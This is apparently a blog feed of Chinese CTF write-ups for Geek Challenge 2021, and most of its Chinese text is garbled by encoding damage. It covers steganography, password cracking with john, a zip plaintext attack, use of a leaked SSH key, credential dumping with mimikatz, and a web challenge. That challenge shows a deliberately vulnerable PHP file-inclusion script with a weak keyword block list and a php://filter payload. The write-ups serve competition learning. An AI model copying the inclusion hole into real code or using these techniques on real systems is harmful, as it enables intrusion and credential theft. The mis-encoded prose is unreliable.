class="hljs-string">&#x27;wb&#x27;</span>)<br><br>f.write(base64.b64decode(<span class="hljs-string">&#x27;&#x27;</span>.join(e[::-<span class="hljs-number">1</span>])))<br>f.close()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ok&#x27;</span>)<br></code></pre></td></tr></table></figure>
<p>flagåœ¨è§£å‡ºæ¥çš„å›¾ç‰‡ä¸Š</p>
<p>å®˜æ–¹wpï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">curl http://110.42.233.91:2333/flag.txt | <span class="hljs-built_in">sort</span> -n | <span class="hljs-built_in">tac</span> | awk -F <span class="hljs-string">&#x27; &#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> | <span class="hljs-built_in">base64</span> -d | <span class="hljs-built_in">base64</span> -d &gt; flag.png ; img2txt flag.png --nocolor --nohtml -- maxLen=30<br></code></pre></td></tr></table></figure>



<h1 id="easycreat"><a href="#easycreat" class="headerlink" title="easycreat"></a>easycreat</h1><blockquote>
<p>Intro &amp;&amp; Hint: æè¿°:åœ¨Rosptenæµ‹è¯•é“¾éƒ¨ç½²ä¸€ä¸ªåˆçº¦</p>
</blockquote>
<p><a href="https://www.lewiserii.top/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%9C%A8Rospten%E6%B5%8B%E8%AF%95%E9%93%BE%E9%83%A8%E7%BD%B2%E4%B8%80%E4%B8%AA%E5%90%88%E7%BA%A6.html">å•ç‹¬æ‹¿å‡ºæ¥å†™äº†ä¸€ç¯‡æ–‡ç« </a><br>æäº¤hashéªŒè¯å³å¯</p>
<h1 id="ä»Šå¤©æœ‰è¢«ç ´é˜²å—ï¼Ÿ"><a href="#ä»Šå¤©æœ‰è¢«ç ´é˜²å—ï¼Ÿ" class="headerlink" title="ä»Šå¤©æœ‰è¢«ç ´é˜²å—ï¼Ÿ"></a>ä»Šå¤©æœ‰è¢«ç ´é˜²å—ï¼Ÿ</h1><blockquote>
<p>Intro &amp;&amp; Hint: æ¯ä¸ªäººéƒ½æœ‰å†³å®šè‡ªå·±æ˜¯è°çš„æƒåŠ›</p>
</blockquote>
<p>ä¸‰ä¸ªä¸€ç»„çš„åå…­è¿›åˆ¶å€¼ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°RGB<br>å› ä¸ºä¸€å…±æœ‰1166400è¡Œï¼Œæ˜¯1080çš„å¹³æ–¹æ•°ï¼Œå¾—å‡ºåŸå›¾ç‰‡é«˜å®½ä¸º1080<br>è„šæœ¬è¿˜åŸ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>,(<span class="hljs-number">1080</span>,<span class="hljs-number">1080</span>))<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;ans.txt&#x27;</span>)<br>d=f.readlines()<br>d=[<span class="hljs-built_in">tuple</span>([<span class="hljs-built_in">int</span>(i.strip().split()[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>),<span class="hljs-built_in">int</span>(i.strip().split()[<span class="hljs-number">1</span>],<span class="hljs-number">16</span>),<span class="hljs-built_in">int</span>(i.strip().split()[<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d]<br>a.putdata(d)<br>a.save(<span class="hljs-string">&#x27;ans.png&#x27;</span>)<br></code></pre></td></tr></table></figure>
<p><img src="/img/wp/2021/2021jike-misc-5.png"><br>å¯ä»¥ä½¿ç”¨gapsæ‹¼å›¾ï¼Œå…ˆç”¨ç”»å›¾é‡å‡ºå°åŒºåŸŸçš„é«˜å®½<br><img src="/img/wp/2021/2021jike-misc-6.png"></p>
<p><code>gaps --image=1.png  --size=40 --save</code></p>
<p><img src="/img/wp/2021/2021jike-misc-7.png"></p>
<p>æœ€åå‚ç›´ç¿»è½¬ä¸€ä¸‹å›¾ç‰‡å¾—åˆ°flag</p>
<h1 id="è¯´å®è¯æŒºå¥½ç©çš„ï¼Œä¸æ˜¯å—ï¼Ÿ"><a href="#è¯´å®è¯æŒºå¥½ç©çš„ï¼Œä¸æ˜¯å—ï¼Ÿ" class="headerlink" title="è¯´å®è¯æŒºå¥½ç©çš„ï¼Œä¸æ˜¯å—ï¼Ÿ"></a>è¯´å®è¯æŒºå¥½ç©çš„ï¼Œä¸æ˜¯å—ï¼Ÿ</h1><blockquote>
<p>Intro &amp;&amp; Hint: ä½ è¦æ˜¯è§‰å¾—å¥½ç©ï¼Œé‚£å°±ç©ç©è¿™ä¸ª</p>
</blockquote>
<p>è§£å‹åæ˜¯ä¸€ä¸ªå¸¦å¯†ç çš„docxæ–‡ä»¶<br>å‹ç¼©åŒ…ä¸­çš„æç¤º<br><img src="/img/wp/2021/2021jike-misc-8.png"><br>ä½¿ç”¨johnçˆ†ç ´å¯†ç <br>ç»“æœæ˜¯<code>767675</code>ï¼ŒæŒºå‘çš„ï¼Œä»¥ä¸ºæ˜¯8ä½æ•°å­—ï¼Œçˆ†äº†ä¸¤å¤©æ²¡å‡º<br><img src="/img/wp/2021/2021jike-misc-9.png"><br>å°†docxå†…å®¹å¤åˆ¶åˆ°txtç”¨åå…­è¿›åˆ¶æŸ¥çœ‹ï¼Œå¯èƒ½æ˜¯snowåŠ å¯†<br><img src="/img/wp/2021/2021jike-misc-10.png"><br><code>snow.exe -C ans.txt</code>è§£å¯†æ–‡æœ¬<br><img src="/img/wp/2021/2021jike-misc-11.png"></p>
<h1 id="SGA-Character"><a href="#SGA-Character" class="headerlink" title="SGA Character"></a>SGA Character</h1><blockquote>
<p>Intro &amp;&amp; Hint: æè¿°ï¼šç¥ç§˜çš„è¯­è¨€â€¦â€¦ä»¿ä½›åœ¨Minecraftä¸­è§è¿‡</p>
</blockquote>
<p>æ ‡å‡†é“¶æ²³å­—æ¯è¡¨<br><img src="/img/wp/2021/2021jike-misc-12.png"></p>
<p>ä¸é¢˜ç›®å›¾ç‰‡ä¸€ä¸€å¯¹åº”ï¼Œè§£å‡ºflag</p>
<h1 id="åœ£å˜‰ç„¶"><a href="#åœ£å˜‰ç„¶" class="headerlink" title="åœ£å˜‰ç„¶"></a>åœ£å˜‰ç„¶</h1><blockquote>
<p>Intro &amp;&amp; Hint: æè¿°ï¼šå˜‰ç„¶,å¸¦æˆ‘èµ°å§ï¼|hints: 1. <a href="http://www.atoolbox.net/Category.php?Id=28">http://www.atoolbox.net/Category.php?Id=28</a></p>
</blockquote>
<p>åœ¨åå…­è¿›åˆ¶ä¸‹è§‚å¯Ÿæ–‡ä»¶å‘ç°rarå¤´è¢«åˆ äº†ä¸€åŠï¼Œè¡¥ä¸Š<code>52 61 72 21</code><br>ç”¨010æ‰“å¼€ï¼Œå‘ç°å­˜åœ¨ntfsæµéšå†™<br><img src="/img/wp/2021/2021jike-misc-13.png"><br>å¯¼å‡ºç»“æœæ–‡æœ¬<br><img src="/img/wp/2021/2021jike-misc-14.png"><br>æœ‰å¾ˆå¤šemojiè¡¨æƒ…</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">æˆ‘å¥½æƒ³åšå˜‰ç„¶ğŸ‘ªå°å§çš„ç‹—å•Šã€‚ å¯æ˜¯å˜‰ç„¶å°å§è¯´å¥¹å–œæ¬¢çš„æ˜¯çŒ«ğŸ˜ï¼Œæˆ‘ğŸ‘°å“­äº†ã€‚ æˆ‘çŸ¥é“æ—¢ä¸æ˜¯ç‹—ä¹Ÿä¸æ˜¯çŒ«çš„æˆ‘ä¸ºä»€ä¹ˆè¦å“­çš„ã€‚å› ä¸ºæˆ‘å…¶å®æ˜¯ä¸€åªè€é¼ <br>ğŸ‘£ã€‚ æˆ‘ä»æ²¡å¥¢æœ›å˜‰ç„¶å°å§èƒ½å–œæ¬¢è‡ªå·±ğŸ‘´ã€‚æˆ‘æ˜ç™½çš„ï¼Œæ‰€æœ‰äººéƒ½å–œæ¬¢ç†è§£ä½™è£•ä¸Šæ‰‹å¤©æ‰æ‰“é’±çš„èŒèŒçš„ç‹—ç‹—æˆ–è€…çŒ«çŒ«ğŸ‘šï¼Œæ²¡æœ‰äººä¼šå–œæ¬¢é˜´æ¹¿å¸¦ç—…çš„è€é¼ ã€‚ ä½†æˆ‘è¿˜æ˜¯é—®äº†å˜‰ç„¶å°å§:â€œæˆ‘èƒ½ä¸èƒ½åšä½ çš„ç‹—ï¼Ÿâ€ æˆ‘çŸ¥é“æˆ‘æ˜¯æ³¨å®šåšä¸äº†ç‹—ğŸ‘œçš„ã€‚ä½†å¦‚æœå¥¹å–œæ¬¢ç‹—ï¼Œæˆ‘ğŸ‘²å°±å¯ä»¥ä¸€ç›´åœ¨èº«è¾¹çœ‹ç€å¥¹äº†ï¼Œå“ªæ€•å¥¹æ€€é‡ŒæŠ±ç€çš„æ°¸è¿œéƒ½æ˜¯ç‹—ã€‚ å¯æ˜¯å¥¹è¯´å–œæ¬¢çš„æ˜¯çŒ«ã€‚ å¥¹ç°åœ¨è¿˜åœ¨çœ‹ç€æˆ‘ï¼Œè¿˜åœ¨é€—æˆ‘å¼€å¿ƒï¼Œæ˜¯å› ä¸ºçŒ«è¿˜æ²¡æœ‰å‡ºç°ï¼Œåªæœ‰æˆ‘è¿™è€é¼ æ¯å¤©è¹‘æ‰‹è¹‘è„šåœ°ä»æ´ğŸ‘é‡Œçˆ¬å‡ºæ¥ï¼Œè¿œè¿œåœ°å’Œå¥¹å¯¹è§†ã€‚ ç­‰å¥¹å–œæ¬¢çš„çŒ«ğŸ‘›æ¥äº†çš„æ—¶å€™ï¼Œæˆ‘å°±è¯¥é‡æ–°æ»šå›æˆ‘ğŸ‘¥çš„æ´äº†å§ã€‚ ä½†æˆ‘è¿˜æ˜¯å¥½å–œæ¬¢å¥¹ğŸ‘ ï¼Œå¥¹èƒ½åœ¨æˆ‘è¿˜åœ¨å¥¹èº«è¾¹çš„æ—¶å€™å¤šçœ‹æˆ‘å‡ çœ¼å—ğŸ‘˜ï¼Ÿ å˜‰ç„¶å°å§è¯´æ¥ä¸‹æ¥çš„æ¯ä¸ªåœ£è¯å¤œéƒ½è¦å’Œå¤§å®¶ä¸€èµ·è¿‡ğŸ‘˜ã€‚æˆ‘ä¸çŸ¥é“å¤§å®¶æŒ‡å“ªäº›äººğŸ‘–ã€‚å¥½å¸Œæœ›è¿™ä¸ªé›†åˆèƒ½å¤Ÿå¯¹æˆ‘åšä¸€æ¬¡èƒåğŸ‘¥ã€‚ çŒ«çŒ«ğŸ‘°è¿˜åœ¨å®³æ€•å˜‰ç„¶å°å§ã€‚ æˆ‘ä¼šå»æŠŠå¥¹çˆ±çš„çŒ«çŒ«å¼•æ¥çš„ğŸ‘˜ã€‚ æˆ‘ğŸ‘¤çŸ¥é“ç¨æœ‰ä¸æ…ï¼Œæˆ‘å°±ä¼šè‘¬èº«çŒ«ğŸ˜å£ã€‚ é‚£æ—¶å€™å˜‰ç„¶å°å§å¤§æ¦‚ä¼šæŠŠæˆ‘çš„èº«ä½“å¥½å¥½åœ°è£…èµ·æ¥æ‰”åˆ°é—¨å¤–ğŸ‘–å§ã€‚ é‚£æˆ‘å°±æˆäº†ä¸€åŒ…é¼ æ¡ğŸ‘°ï¼Œå˜»å˜»ğŸ‘œã€‚ æˆ‘å¸Œæœ›å¥¹èƒ½æŠŠæˆ‘æ‰”å¾—è¿‘ä¸€ç‚¹ğŸ§ï¼Œå› ä¸ºæˆ‘è¿˜æ˜¯å¥½å–œæ¬¢å¥¹ğŸ‘©ã€‚ä¼šä¸€ç›´å–œæ¬¢ä¸‹å»çš„ã€‚ æˆ‘çš„çµé­‚é€è¿‡çª—æˆ·å‘é‡Œé¢çœ‹å»ï¼ŒæŒ‚ç€çš„é“ƒé“›åœ¨è½»è½»é¸£å“ï¼Œå˜‰ç„¶å°å§æ…µæ‡’åœ°é åœ¨æ²™å‘ä¸Šï¼Œè¡¨æ¼”å¾—éå¸¸æ¸©é¡ºçš„æ©˜çŒ«ååœ¨å¥¹çš„è‚©è†€ğŸ‘¬ã€‚å£ç‚‰çš„ç«å…‰ç…§åœ¨å¥¹çš„è„¸åºï¼Œæˆ‘å†»åƒµçš„å¿ƒè„åœ¨é£é‡Œå¾®å¾®å‘çƒ«ğŸ‘˜ğŸ‘–ã€‚ â€”æ–°æˆ·çœ å­<br></code></pre></td></tr></table></figure>
<p>å°†è¡¨æƒ…æå–å‡ºæ¥è§£å¯†<br><img src="/img/wp/2021/2021jike-misc-15.png"><br>å¾—åˆ°<code>s!yl&#125;ce&#123;gdniaa_nyam!_ye0rua_</code>ï¼Œå¾ˆæ˜æ˜¾çš„wå‹æ …æ <br><img src="/img/wp/2021/2021jike-misc-16.png"></p>
<h1 id="æ¯æ—¥ä¸€æºœ"><a href="#æ¯æ—¥ä¸€æºœ" class="headerlink" title="æ¯æ—¥ä¸€æºœ"></a>æ¯æ—¥ä¸€æºœ</h1><blockquote>
<p>Intro &amp;&amp; Hint: æè¿°ï¼šBV1vK4y1p7F5|hints: 1. <a href="https://blog.csdn.net/huanghelouzi/article/details/88628590">https://blog.csdn.net/huanghelouzi/article/details/88628590</a></p>
</blockquote>
<p>æ•°æ®åŒ…åˆ†æï¼Œä½¿ç”¨wireshark<br>å‘ç°POSTåŒ…ï¼Œä¼ è¾“äº†ä¸€å¼ pngå›¾ç‰‡<br><code>ctrl+alt+shift+t</code>è¿½è¸ªtcpæµ<br>è½¬ä¸ºåŸå§‹æ•°æ®åå¦å­˜ä¸ºpng<br><img src="/img/wp/2021/2021jike-misc-17.png"><br>ç”¨binwalkåˆ†ç¦»å‡ºä¸€ä¸ªæ–‡ä»¶</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><code class="hljs gcode">FhMrPh<span class="hljs-number">94</span>JHqS<span class="hljs-number">2</span>jGQG<span class="hljs-name">M6</span>QCsaDzI<span class="hljs-number">6</span>ZyHqQQB==<br>d<span class="hljs-symbol">nd4</span>c<span class="hljs-symbol">nN0</span>dW<span class="hljs-number">9</span>wcT<span class="hljs-name">M0</span><span class="hljs-symbol">NTY3</span>QUJDREVGR<span class="hljs-number">0</span>lIS<span class="hljs-symbol">nl6</span>MDIxUFFSU<span class="hljs-number">1</span>RLTk<span class="hljs-number">1</span>MT<span class="hljs-number">1</span>phYm<span class="hljs-symbol">NkVVZXWFllZmdoaWprbG1</span>uODkrLw==<br></code></pre></td></tr></table></figure>
<p>å°†ç¬¬äºŒä¸ªbase64è§£å¯†åå¾—åˆ°ä¸€ä¸ªbase64è¡¨ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªbase64å°±æ˜¯æ¢è¡¨åŠ å¯†åçš„å€¼<br>è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br><br>str1 = <span class="hljs-string">&quot;FhMrPh94JHqS2jGQGM6QCsaDzI6ZyHqQQB==&quot;</span><br><br>string1 = <span class="hljs-string">&quot;vwxrstuopq34567ABCDEFGIHJyz021PQRSTKNMLOZabcdUVWXYefghijklmn89+/&quot;</span><br>string2 = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><br><span class="hljs-built_in">print</span> (base64.b64decode(str1.translate(<span class="hljs-built_in">str</span>.maketrans(string1,string2))))<br><br><span class="hljs-comment">#str1æ˜¯è¦è§£å¯†çš„ä»£ç </span><br><span class="hljs-comment">#string1æ˜¯æ”¹è¿‡ä¹‹åçš„base64è¡¨</span><br></code></pre></td></tr></table></figure>


<h1 id="PANDORA-PARADOXXX"><a href="#PANDORA-PARADOXXX" class="headerlink" title="PANDORA PARADOXXX"></a>PANDORA PARADOXXX</h1><blockquote>
<p>Intro &amp;&amp; Hint: æè¿°ï¼šä¸ºäº†é˜²æ­¢å®ƒæ¯ç­ä¸–ç•Œï¼Œæˆ‘ä¸Šäº†å±‚å±‚æ·é”â€¦â€¦</p>
</blockquote>
<p>ä¸‹è½½å¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œå‘ç°æ–‡ä»¶ä¸­è—äº†å‹ç¼©åŒ…ï¼Œbinwalkåˆ†ç¦»<br>ç¬¬äºŒå±‚ï¼šæ ‡å‡†ä¼ªåŠ å¯†ï¼Œ<code>09</code>æ”¹æˆ<code>00</code><br>ç¬¬ä¸‰å±‚ï¼šçº¯æ•°å­—çˆ†ç ´ï¼Œå¾—åˆ°è§£å‹å¯†ç <code>513692</code><br>ç¬¬å››å±‚ï¼šå‘ç°å‹ç¼©åhint.txtçš„crcå€¼ä¸2.zipå†…hint.txtçš„crcå€¼ä¸€æ ·,å¯ä»¥å¾—å‡ºæ˜¯æ˜æ–‡æ”»å‡»<br><img src="/img/wp/2021/2021jike-misc-18.png"><br>è§£å¾—å£ä»¤ä¸º<code>Maimai</code><br><img src="/img/wp/2021/2021jike-misc-19.png"><br>ç¬¬äº”å±‚ï¼šè¿™ä¸€ä¸ªå¯†ç å±å®æ˜¯æ²¡æƒ³åˆ°ï¼Œå¯†ç ä¸ºhintä¸­çš„å•è¯<code>challenge</code><br>ç¬¬å…­å±‚ï¼šè§£å‹åå°±æ˜¯flag</p>
<h1 id="easyfound"><a href="#easyfound" class="headerlink" title="easyfound"></a>easyfound</h1><blockquote>
<p>Intro &amp;&amp; Hint: æè¿°ï¼šflagåœ¨å“ªé‡Œ 0xf8e8f25359bbbdea2187c34a8614dbedec083dbb@rospten</p>
</blockquote>
<p>ç»™äº†åˆçº¦æºç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs solidity">contract syc&#123;<br>    address owner=0x0b896c359adf4bb1c19c7dfd41dc35dc9216e470;<br>    bool a=true;<br>    bool b=false;<br>    uint[] tuple=[0x77,0x88,0x99];<br>    strings[] flag=[flag1,flag2];<br>&#125;<br></code></pre></td></tr></table></figure>
<p>è¿™é¢˜æ¶‰åŠåˆ°åŒºå—é“¾çš„å˜é‡å­˜å‚¨æœºåˆ¶ï¼Œæ¨è<a href="https://xz.aliyun.com/t/9837">ä¸€ç¯‡æ–‡ç« </a></p>
<p>ä»£ç ä¸­ä¸€å…±å­˜å‚¨äº†8ä¸ªå˜é‡ï¼Œåˆ†åˆ«æ˜¯<code>owner</code>,<code>a</code>,<code>b</code>,<code>0x77</code>,<code>0x88</code>,<code>0x99</code>,<code>flag1</code>,<code>flag2</code><br>åœ¨åŒºå—é“¾æµè§ˆå™¨ä¸­æŸ¥çœ‹æ’æ§½</p>
<p><code>https://ropsten.etherscan.io/tx/0xcf7759b8d59b9c462c5c8a69a30e9b862bee3cbac995d896d58ba8ef592bdafe#statechange</code></p>
<p>ç¬¬ä¸€ä¸ªæ’æ§½å­˜å‚¨çš„æ˜¯åœ°å€<code>owner</code><br><img src="/img/wp/2021/2021jike-misc-20.png"><br>ç¬¬äºŒå’Œç¬¬ä¸‰ä¸ªæ’æ§½å­˜å‚¨çš„æ˜¯boolå˜é‡<code>a</code>å’Œ<code>b</code><br><img src="/img/wp/2021/2021jike-misc-21.png"><br>ç¬¬å››å’Œç¬¬äº”ä¸ªæ’æ§½å­˜å‚¨çš„æ˜¯stringsç±»å‹çš„å˜é‡<code>flag1</code>å’Œ<code>flag2</code>,å°†ä¸¤ä¸ªå˜é‡è¿æ¥åˆ°ä¸€èµ·å°±æ˜¯flagäº†ï¼Œæ³¨æ„<code>$</code>ç¬¦å·æ˜¯è¿æ¥ç¬¦<br><img src="/img/wp/2021/2021jike-misc-22.png"><br>ç¬¬å…­ä¸ƒå…«å­˜çš„æ˜¯<code>tuple</code>æ•°ç»„<br><img src="/img/wp/2021/2021jike-misc-23.png"></p>
<h1 id="ä¸‰å¶è‰èšä¼š"><a href="#ä¸‰å¶è‰èšä¼š" class="headerlink" title="ä¸‰å¶è‰èšä¼š"></a>ä¸‰å¶è‰èšä¼š</h1><blockquote>
<p>Intro &amp;&amp; Hint: æè¿°: å˜¿ï¼Œæˆ‘ä»¬å»èšä¼šå§!æ‹¿ç€ä½ çš„å…¥é—¨åˆ¸! | hints: 1.æ³¨æ„é¢˜ç›®åç§°</p>
</blockquote>
<p>è§£å‹åå¾—åˆ°ä¸€ä¸ªkeyå’Œhint.txt<br>ä»hint.txtä¸­å¯ä»¥çŸ¥é“ä¸gitæœ‰å…³ï¼Œæ—¢ç„¶çŸ¥é“äº†å¯†é’¥ï¼Œé‚£ä¹ˆå°±ç”¨sshè¿æ¥<br>å…ˆåˆ›å»ºä¸€ä¸ª.sshæ–‡ä»¶å¤¹ï¼Œæ”¾å…¥keyï¼Œåˆ›å»ºä¸€ä¸ªconfigæ–‡ä»¶<br>configæ–‡ä»¶å†…å®¹å¦‚ä¸‹</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><code class="hljs crmsh">Host syc<br>        HostName github.com<br>        <span class="hljs-keyword">User</span> <span class="hljs-title">git</span><br>        Port <span class="hljs-number">22</span><br>        IdentityFile ~/.ssh/key<br></code></pre></td></tr></table></figure>

<p>ä½¿ç”¨<code>ssh -T syc</code>è¿æ¥ï¼Œè·å–åˆ°ç”¨æˆ·åä¸º<code>SycloverParty</code><br><img src="/img/wp/2021/2021jike-misc-24.png"></p>
<p>åœ¨githubä¸Šæœç´¢è¯¥ç”¨æˆ·åï¼Œå¾—çŸ¥æœ‰ä¸€ä¸ªç§æœ‰çš„ä»“åº“<code>cake</code><br><img src="/img/wp/2021/2021jike-misc-25.png"></p>
<p><code>git clone syc:SycloverParty/cake.git</code>ä¸‹è½½ä¸‹æ¥<br><img src="/img/wp/2021/2021jike-misc-26.png"></p>
<p>æœ‰ä¸€ä¸ªå‡çš„flagï¼Œä½¿ç”¨<code>git log --pretty=oneline flag</code>æŸ¥çœ‹æ–‡ä»¶ä¿®æ”¹å†å²<br><img src="/img/wp/2021/2021jike-misc-27.png"></p>
<p><code>git show 7226aee143cc7cd4095337fca6f994848bd9783a</code>æŸ¥çœ‹å†å²è®°å½•<br><img src="/img/wp/2021/2021jike-misc-28.png"></p>
<h1 id="EzForensics"><a href="#EzForensics" class="headerlink" title="EzForensics"></a>EzForensics</h1><blockquote>
<p>Intro &amp;&amp; Hint: ç®€å•å–è¯ï¼Œå…³é”®ä¿¡æ¯åœ¨å‹ç¼©åŒ…é‡Œ,ä¸€å±‚ä¸€å±‚æ‰¾å‡ºæ¥å§</p>
</blockquote>
<p>ç®€å•å–è¯é¢˜<br>å…ˆè·å–é•œåƒä¿¡æ¯<br><img src="/img/wp/2021/2021jike-misc-29.png"></p>
<blockquote>
<p>ä¸€ï¼š æŸ¥çœ‹é»˜è®¤æµè§ˆå™¨è®¿é—®è¿‡çš„ä¸€ä¸ª topåç¼€çš„åŸŸå ä¾‹å¦‚xxxxxx.top</p>
</blockquote>
<p>å…ˆç”¨äº†<code>iehistory</code>å‘½ä»¤æŸ¥çœ‹æ— æœ<br>é‚£ä¹ˆæŸ¥æ–‡ä»¶<br>æ‰¾åˆ°ä¸€ä¸ªchromeçš„è®°å½•<br><img src="/img/wp/2021/2021jike-misc-30.png"></p>
<p>ä¸‹è½½ä¸‹æ¥æœç´¢<br>å¾—åˆ°åŸŸåä¸º<code>3v1l.rigelx.top</code><br><img src="/img/wp/2021/2021jike-misc-31.png"></p>
<blockquote>
<p>äºŒï¼š å¦ä¸€ä¸ªæµè§ˆå™¨è¢«ç”¨æ¥ä¸‹è½½äº†ä¸€ä¸ªæ–‡ä»¶ æ‰¾åˆ°è¿™ä¸ªå¥‡æ€ªçš„æ–‡ä»¶å ï¼ˆå¾ˆæ€ª</p>
</blockquote>
<p>æŸ¥çœ‹ä¸‹è½½æ–‡ä»¶å¤¹<br>å¾—åˆ°å¯ç–‘æ–‡ä»¶<code>L0v3r.f</code><br><img src="/img/wp/2021/2021jike-misc-32.png"></p>
<blockquote>
<p>ä¸‰ï¼š æœ¬æœºçš„hostnameï¼Œï¼ˆè®¡ç®—æœºåå’Œhostnameä¸€èˆ¬æ˜¯ç›¸åŒçš„ï¼Œä½†å¤§å°å†™ä¸ä¸€æ ·</p>
</blockquote>
<p>å…ˆ<code>hivelist</code>çœ‹æ³¨å†Œè¡¨ä¿¡æ¯åœ°å€<br><img src="/img/wp/2021/2021jike-misc-33.png"></p>
<p>æŸ¥çœ‹<code>system</code><br><img src="/img/wp/2021/2021jike-misc-34.jpg"></p>
<p>æŸ¥çœ‹<code>CurrentControlSet</code>çš„<code>value</code><br><img src="/img/wp/2021/2021jike-misc-35.jpg"></p>
<p>æŸ¥çœ‹<code>ControlSet001</code>çš„<code>value</code><br><img src="/img/wp/2021/2021jike-misc-36.jpg"></p>
<p>ç»§ç»­çœ‹<code>ControlSet001</code>ä¸‹çš„<code>\services\tcpip\Parameters</code><br><img src="/img/wp/2021/2021jike-misc-37.jpg"></p>
<p>å¾—åˆ°ä¸»æœºå<code>P0tt3r</code></p>
<blockquote>
<p>å››ï¼š ç™»å½•1é‡Œçš„ç«™ç‚¹ï¼Œå°è¯•ä»é•œåƒä¸­æ‰¾åˆ°ç”¨æˆ·åå’Œå¯†ç ï¼ˆä¸windowsçš„ä¸€è‡´ï¼‰çœ‹çœ‹æœ‰ä»€ä¹ˆç§˜å¯†</p>
</blockquote>
<p>æœ€åä½¿ç”¨<code>mimikatz</code>æ‹¿åˆ°è´¦æˆ·å’Œå¯†ç <br><img src="/img/wp/2021/2021jike-misc-38.jpg"></p>
<p>ç™»å½•ç«™ç‚¹åè‡ªåŠ¨ä¸‹è½½å¾—åˆ°ä¸€ä¸ª<code>secretword.wav</code>æ–‡ä»¶<br>å¤§æ¦‚å¬äº†ä¸€ä¸‹ï¼Œæ˜¯æ‹¨å·éŸ³ï¼Œ<a href="https://xiangyuecn.github.io/Recorder/assets/%E5%B7%A5%E5%85%B7-%E4%BB%A3%E7%A0%81%E8%BF%90%E8%A1%8C%E5%92%8C%E9%9D%99%E6%80%81%E5%88%86%E5%8F%91Runtime.html?jsname=teach.dtmf.decode_and_encode">åœ¨çº¿è§£å¯†</a><br>å¾—åˆ°<code>10111011100000</code><br><img src="/img/wp/2021/2021jike-misc-39.jpg"></p>
<p>è½¬æˆæ‘©æ–¯ï¼Œè§£å¯†å¾—åˆ°<code>yyds</code></p>
<blockquote>
<p>äº”ï¼šæ‹¼æ¥åmd5</p>
</blockquote>
<p><code>SYC&#123;md5(3v1l.rigelx.topL0v3r.fP0tt3ryyds)&#125;</code><br>å°†ä¸Šè¿°å­—æ®µæ‹¼æ¥åœ¨ä¸€èµ·åmd5åŠ å¯†ä¸€ä¸‹</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2021</tag>
        <tag>æå®¢æŒ‘æˆ˜</tag>
      </tags>
  </entry>
  <entry>
    <title>æå®¢æŒ‘æˆ˜2021-æœŸæœ«ä¸æŒ‚ç§‘å°±ç®—æˆåŠŸ-wp</title>
    <url>/posts/993a04bf/</url>
    <content><![CDATA[<h1 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h1><blockquote>
<p>ä½ æŒ‚ç§‘å’¯ è¯•è¯•æ‰“å…¥å­¦æ ¡å†…ç½‘æ¥ä¿®æ”¹æˆç»©å§(æˆ‘å‘½ç”±æˆ‘ä¸ç”±å¤©ç³»åˆ—)</p>
</blockquote>
<p>å¯ä»¥çŸ¥é“æœ¬é¢˜éœ€è¦ä½¿ç”¨ssrf</p>
<h1 id="ä¼ªåè®®"><a href="#ä¼ªåè®®" class="headerlink" title="ä¼ªåè®®"></a>ä¼ªåè®®</h1><p>åœ¨æºä»£ç ä¸­å‘ç°<code>debug.php</code><br><img src="/img/wp/2021/2021jike-1.png"></p>
<p>åœ¨debug.phpä¸­å‘ç°å¯ä»¥ä½¿ç”¨ä¼ªåè®®<br><img src="/img/wp/2021/2021jike-2.png"></p>
<p>ä¼ å…¥<code>?file=php://filter/convert.base64-encode/resource=debug.php</code>æŸ¥çœ‹debug.phpçš„æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//debug.phpå…³é”®æºç </span><br><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;å¿«å»å­¦ä¹ PHPä¼ªåè®®&lt;/h1&gt;&quot;</span>;<br>	<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>	<span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>	<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;../&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;tp&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;input&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;data&quot;</span>))&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;NOï¼ï¼ï¼&quot;</span>;<br>		<span class="hljs-keyword">exit</span>();<br>	&#125;<br>	<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

